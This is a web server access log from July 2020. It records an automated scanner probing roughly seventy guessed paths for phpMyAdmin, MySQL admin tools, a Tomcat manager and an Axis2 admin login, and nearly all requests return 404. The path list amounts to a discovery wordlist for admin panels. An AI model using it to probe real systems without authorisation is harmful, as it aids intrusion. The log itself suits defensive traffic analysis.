- - [28/Jul/2020:01:00:45 +0000] "GET /phpmyadmin1/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:48 +0000] "GET /phpmyadmin2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:48 +0000] "GET /phpMyAdmin-4.4.0/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:49 +0000] "GET /phpMyAdmin4.8.0/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:49 +0000] "GET /phpMyAdmin4.8.1/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:52 +0000] "GET /phpMyAdmin4.8.2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:52 +0000] "GET /phpMyAdmin4.8.3/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:53 +0000] "GET /phpMyAdmin4.8.4/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:53 +0000] "GET /phpMyAdmin4.8.5/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:56 +0000] "GET /myadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:56 +0000] "GET /myadmin2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:57 +0000] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:57 +0000] "GET /phpMyadmin_bak/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:00 +0000] "GET /www/phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:00 +0000] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:01 +0000] "GET /phpmyadmin-old/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:01 +0000] "GET /phpMyAdminold/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:04 +0000] "GET /phpMyAdmin.old/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:04 +0000] "GET /pma-old/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:05 +0000] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:05 +0000] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:08 +0000] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:08 +0000] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:09 +0000] "GET /phpMyAbmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:10 +0000] "GET /phpMyAdmin__/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:12 +0000] "GET /v/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:12 +0000] "GET /phpmyadm1n/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:13 +0000] "GET /phpMyAdm1n/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:13 +0000] "GET /shaAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:16 +0000] "GET /phpMyAdmion/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:16 +0000] "GET /s/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:17 +0000] "GET /MyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:17 +0000] "GET /phpMyAdmin1/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:20 +0000] "GET /pwd/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:20 +0000] "GET /phpMyAdmina/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:21 +0000] "GET /phpMydmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:21 +0000] "GET /phpMyAdmins/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:24 +0000] "GET /phpMyAdmin._2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:24 +0000] "GET /phpmyadmin2222/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:25 +0000] "GET /phpMyAdmin333/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:25 +0000] "GET /phpmyadmin3333/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:32 +0000] "GET /phpNyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:32 +0000] "GET /1/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:36 +0000] "GET /download/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:36 +0000] "GET /phpMyAdmin_111/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:40 +0000] "GET /phpmadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:40 +0000] "GET /321/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:44 +0000] "GET /123131/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:44 +0000] "GET /phpMyAdminn/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:45 +0000] "GET /phpMyAdminhf/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:45 +0000] "GET /sbb/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:48 +0000] "GET /phpMyAdmln/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:48 +0000] "GET /phpMyAdmin_ai/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:49 +0000] "GET /__phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:49 +0000] "GET /program/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:56 +0000] "GET /phpmy/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:01:56 +0000] "GET /mysql/admin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:02:00 +0000] "GET /mysql/dbadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:02:00 +0000] "GET /mysql/sqlmanager/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:02:04 +0000] "GET /mysql/mysqlmanager/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:02:04 +0000] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:02:08 +0000] "GET /sqladmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:02:08 +0000] "GET /sql/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:02:09 +0000] "GET /SQL/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:02:09 +0000] "GET /websql/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:02:10 +0000] "GET /MySQLAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:02:12 +0000] "GET /manager/html HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0"
- - [28/Jul/2020:01:02:12 +0000] "POST /axis2/axis2-admin/login HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"
- - [28/Jul/2020:01:03:48 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
- - [28/Jul/2020:06:03:41 +0000] "GET / HTTP/1.0" 200 2406 "-" - "-"
